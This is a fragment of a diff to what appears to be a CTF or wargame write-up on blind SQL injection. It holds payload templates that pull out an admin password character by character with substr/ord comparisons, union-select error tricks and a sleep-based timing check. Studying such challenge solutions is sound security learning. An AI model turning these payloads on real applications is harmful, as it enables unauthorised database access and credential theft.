@@ -679,7 +679,7 @@ payload = ' or if(ord(substr({pw},{i},1))={j},( select 1 union select 2),1)-- -
 
 payload = 'or id = 'admin' and (select 1 union select ord(substr({pw},{i},1))={j})-- -
 
-## Hell\_FIre(order by)
+## Hell\_FIre(time based)
 
 ```php
 <?php
@@ -704,5 +704,5 @@ payload = 'or id = 'admin' and (select 1 union select ord(substr({pw},{i},1))={j
 ?>
 ```
 
-payload = if(id = "admin" and substr({pw},{i},1)="{j}", (select {col1}) , (select {col2}))
+payload = if({col} = "admin" and substr({pw},{i},1)="{j}", sleep(2) , (select {col}))
 
